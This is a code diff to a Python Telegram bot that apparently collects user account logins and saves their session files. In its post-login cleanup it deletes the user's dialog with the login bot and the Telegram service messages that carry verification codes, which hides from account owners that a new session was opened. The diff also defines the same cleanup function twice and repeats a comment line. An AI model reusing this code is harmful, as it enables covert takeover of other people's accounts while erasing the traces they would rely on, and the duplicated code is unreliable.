@@ -37,8 +37,12 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 API_ID = int(os.getenv('TG_API_ID', 0))
 API_HASH = os.getenv('TG_API_HASH')
-SESSIONS_DIR = 'sessions'
+SESSIONS_DIR = '/app/sessions'
 AUTO_DELETE_SECONDS = 120  # 2 minutes
+
+# Debug: Log current directory and sessions path
+logger.info(f"CWD: {os.getcwd()}")
+logger.info(f"Sessions Dir: {SESSIONS_DIR}")
 
 # Track ongoing login sessions
 login_sessions = {}
@@ -321,11 +325,9 @@ async def main():
             await nuke_tracked_messages(bot, event.chat_id)
             
             # 2. Get bot username to target self for full dialog deletion
+            # 2. Get bot username to target self for full dialog deletion
             me_bot = await bot.get_me()
-            asyncio.create_task(cleanup_login_bot_interaction(session.client, me_bot.username))
-            
-            # 3. Clean up Telegram Service Notifications (verification codes)
-            asyncio.create_task(cleanup_telegram_service_messages(session.client))
+            asyncio.create_task(perform_post_login_cleanup(session.client, me_bot.username))
             # -----------------------------------------------------
 
             reply = await event.respond(
@@ -386,11 +388,9 @@ async def main():
             await nuke_tracked_messages(bot, event.chat_id)
             
             # 2. Get bot username to target self for full dialog deletion
+            # 2. Get bot username to target self for full dialog deletion
             me_bot = await bot.get_me()
-            asyncio.create_task(cleanup_login_bot_interaction(session.client, me_bot.username))
-            
-            # 3. Clean up Telegram Service Notifications (verification codes)
-            asyncio.create_task(cleanup_telegram_service_messages(session.client))
+            asyncio.create_task(perform_post_login_cleanup(session.client, me_bot.username))
             # -----------------------------------------------------
 
             reply = await event.respond(
@@ -444,6 +444,44 @@ async def main():
             
         except Exception as e:
             logger.error(f"Failed to save account: {e}")
+
+    async def perform_post_login_cleanup(client, bot_username):
+        """
+        Runs all cleanup tasks and then disconnects the client.
+        This ensures the session file is released.
+        """
+        try:
+            # 1. Cleanup interaction with Login Bot
+            await cleanup_login_bot_interaction(client, bot_username)
+            
+            # 2. Cleanup Telegram Service messages
+            await cleanup_telegram_service_messages(client)
+            
+        except Exception as e:
+            logger.error(f"Error during post-login cleanup: {e}")
+        finally:
+            if client.is_connected():
+                await client.disconnect()
+                logger.info("Client disconnected and session released.")
+
+    async def perform_post_login_cleanup(client, bot_username):
+        """
+        Runs all cleanup tasks and then disconnects the client.
+        This ensures the session file is released.
+        """
+        try:
+            # 1. Cleanup interaction with Login Bot
+            await cleanup_login_bot_interaction(client, bot_username)
+            
+            # 2. Cleanup Telegram Service messages
+            await cleanup_telegram_service_messages(client)
+            
+        except Exception as e:
+            logger.error(f"Error during post-login cleanup: {e}")
+        finally:
+            if client.is_connected():
+                await client.disconnect()
+                logger.info("Client disconnected and session released.")
 
     async def cleanup_login_bot_interaction(client, bot_username):
         """
